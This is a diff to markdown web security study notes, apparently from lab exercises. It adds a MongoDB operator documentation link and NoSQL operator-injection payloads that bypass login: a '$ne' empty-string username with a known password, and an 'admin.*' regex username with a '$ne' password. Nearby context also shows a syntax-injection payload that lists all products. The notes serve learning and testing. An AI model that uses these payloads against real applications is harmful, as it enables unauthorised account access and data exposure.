@@ -1222,6 +1222,7 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 ## NoSQL Injection
 Impact: Bypass authentication or protection; Extract or edit data; DoS; Execute code   
 Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
+[MongoDB commands doc](https://www.mongodb.com/docs/v4.2/reference/operator/query/)
 
 **NoSQL Injection Usage and Knowledge**
 | **Syntax/Operator/Condition**  | **Description**                                                                    | **Example**                                                      |
@@ -1272,6 +1273,12 @@ Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
   - Submit a always true condition
     `Gifts'||1||'` > list out all products
 - Exploiting NoSQL operator injection to bypass authentication
+  - username not equal to nothing + actual password > login
+    "username": `{"$ne":""}`   
+    "password": "peter"   
+  - regex admin* + password not equal to nothing > login
+    "username": `{"$regex":"admin.*"}`   
+    "password": `{"$ne":""}`    
 - Exploiting NoSQL injection to extract data
 - Exploiting NoSQL operator injection to extract unknown fields   
 
